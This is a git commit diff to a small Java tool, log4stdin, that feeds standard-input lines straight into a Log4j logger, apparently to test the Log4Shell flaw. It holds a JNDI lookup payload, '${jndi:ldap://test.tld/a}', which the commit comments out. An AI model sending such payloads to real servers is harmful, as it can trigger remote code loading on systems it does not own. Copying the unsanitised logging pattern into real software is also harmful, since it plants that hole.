579b112b811ec12543bfdb50ce859f53c327ccd7
jet <jet@amber.lani>
2022-01-13 22:25:55 +0200

    works

--- log4stdin/src/main/java/io/ajuvonen/log4stdin/log4stdin.java
+++ log4stdin/src/main/java/io/ajuvonen/log4stdin/log4stdin.java
@@ -8,26 +8,26 @@ import org.apache.logging.log4j.Logger;
 public class log4stdin 
 {
 
-    private static final Logger log = LogManager.getLogger("HelloWorld");
+    private static final Logger log = LogManager.getLogger("log4stdin");
 
     public static void main(String[] args) {
         // System.out.println("----- printStdout started -------");
-        log.info("${jndi:ldap://test.tld/a}");
+        // log.info("${jndi:ldap://test.tld/a}");
         
-        // try (BufferedReader reader = new BufferedReader(new InputStreamReader(System.in))) {
-        // String line = null;
-        // while (true) {
-        //     if ((line = reader.readLine()) != null) {
-        //     // System.out.println(line);
-        //     log.info(line);
-        //     } else {
-        //         //input finishes
-        //         // System.out.println("----- input end -------");
-        //     break;
-        //     }
-        // }
-        // } catch (Exception e) {
-        //     System.err.println(e);
-        // }
+        try (BufferedReader reader = new BufferedReader(new InputStreamReader(System.in))) {
+        String line = null;
+        while (true) {
+            if ((line = reader.readLine()) != null) {
+            // System.out.println(line);
+            log.info(line);
+            } else {
+                //input finishes
+                // System.out.println("----- input end -------");
+            break;
+            }
+        }
+        } catch (Exception e) {
+            System.err.println(e);
+        }
     }
 }
